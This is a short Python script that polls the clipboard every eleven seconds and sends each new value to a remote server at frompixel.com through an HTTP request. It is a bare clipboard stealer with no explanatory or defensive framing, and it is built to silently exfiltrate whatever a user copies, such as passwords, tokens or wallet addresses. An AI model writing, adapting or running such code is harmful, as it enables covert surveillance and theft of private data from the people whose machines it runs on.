import urllib, os, sys, requests, pyperclip, time
clist = ['None']

while True:
    clip = pyperclip.paste()
    msg = clip.encode('utf-8')
    if msg not in clist:
        clist.append(msg)
        urllib.urlopen("https://frompixel.com/recept/recept.php?a=" + msg)
    time.sleep(11)
